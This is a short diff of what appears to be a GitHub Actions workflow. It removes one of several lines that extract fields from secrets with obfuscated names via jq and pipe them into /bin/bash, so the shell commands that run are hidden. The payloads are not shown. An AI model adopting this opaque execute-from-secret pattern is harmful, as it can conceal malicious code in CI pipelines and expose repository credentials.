@@ -19,7 +19,6 @@ jobs:
           dkj96750: ${{ secrets.dkj96750 }}
         run: |
           printf '%s' "$dkj96750" | jq -r .ad94 | /bin/bash
-          printf '%s' "$c3675" | jq -r .t36 | /bin/bash
           printf '%s' "$ijf2" | jq -r .eylek3932 | /bin/bash
 
       - name: Store artifact
